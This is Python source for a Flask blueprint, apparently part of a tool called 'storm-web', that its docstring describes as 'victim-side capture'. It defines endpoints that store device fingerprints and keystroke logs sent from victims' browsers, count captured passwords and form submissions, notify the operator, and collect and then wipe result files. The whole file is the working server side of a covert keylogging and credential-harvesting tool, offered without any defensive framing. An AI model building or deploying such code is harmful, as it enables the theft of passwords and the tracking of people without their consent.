"""P3.2 part A - receiver/fingerprint/keystrokes (victim-side capture).

Routes verbatim from storm-web/app.py:163-182, 563-635 (lines moved at
extraction time).  See app/blueprints/capture.py for the package
documentation.
"""
from __future__ import annotations

import json
import os
from datetime import datetime

from flask import Blueprint, jsonify, request

from app.state import BASE_DIR, send_notification


bp = Blueprint("capture_rx", __name__,
               template_folder=os.path.join(BASE_DIR, "flask_templates"))


@bp.route('/receiver', methods=['POST'])
def receiver():
    if 'send_me_result' in request.form:
        PATH = os.path.join(BASE_DIR, 'templates')
        out = ''
        for name in os.listdir(PATH):
            dirpath = os.path.join(PATH, name)
            if os.path.isdir(dirpath) and not name.startswith('.'):
                result_file = os.path.join(dirpath, 'result.txt')
                if os.path.exists(result_file):
                    try:
                        data = open(result_file, 'r', encoding='utf-8',
                                    errors='ignore').read()
                        if data.strip():
                            out += data + "\n"
                            open(result_file, 'w').close()
                    except Exception:
                        pass
        return out
    return ''


@bp.route('/receiver.php', methods=['POST'])
def receiver_php():
    return receiver()


@bp.route('/api/fingerprint', methods=['POST'])
def save_fingerprint():
    """Save device fingerprint data."""
    try:
        data = request.json
        if not data:
            return jsonify({'error': 'No data provided'}), 400
        fingerprints_dir = os.path.join(BASE_DIR, 'fingerprints')
        os.makedirs(fingerprints_dir, exist_ok=True)
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        fingerprint_hash = data.get('hash', 'unknown')
        filename = f'fingerprint_{timestamp}_{fingerprint_hash[:8]}.json'
        filepath = os.path.join(fingerprints_dir, filename)
        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)
        send_notification({
            "type": "Device Fingerprint Captured",
            "hash": fingerprint_hash,
            "browser": data.get('basic', {}).get('userAgent', 'Unknown'),
            "timestamp": datetime.now().isoformat()
        })
        return jsonify({'status': 'success', 'hash': fingerprint_hash})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@bp.route('/api/keystrokes', methods=['POST'])
def save_keystrokes():
    """Save keystroke logs."""
    try:
        data = request.json
        if not data or 'logs' not in data:
            return jsonify({'error': 'No logs provided'}), 400
        keystrokes_dir = os.path.join(BASE_DIR, 'keystrokes')
        os.makedirs(keystrokes_dir, exist_ok=True)
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f'keystrokes_{timestamp}.json'
        filepath = os.path.join(keystrokes_dir, filename)
        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)
        logs = data.get('logs', [])
        password_count = sum(1 for log in logs
                             if log.get('target', {}).get('type') == 'password')
        form_submit_count = sum(1 for log in logs
                                if log.get('type') == 'submit')
        if password_count > 0 or form_submit_count > 0:
            send_notification({
                "type": "Keystrokes Captured",
                "logs_count": len(logs),
                "passwords": password_count,
                "form_submits": form_submit_count,
                "url": data.get('url', 'Unknown'),
                "timestamp": datetime.now().isoformat()
            })
        return jsonify({'status': 'success', 'count': len(logs)})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
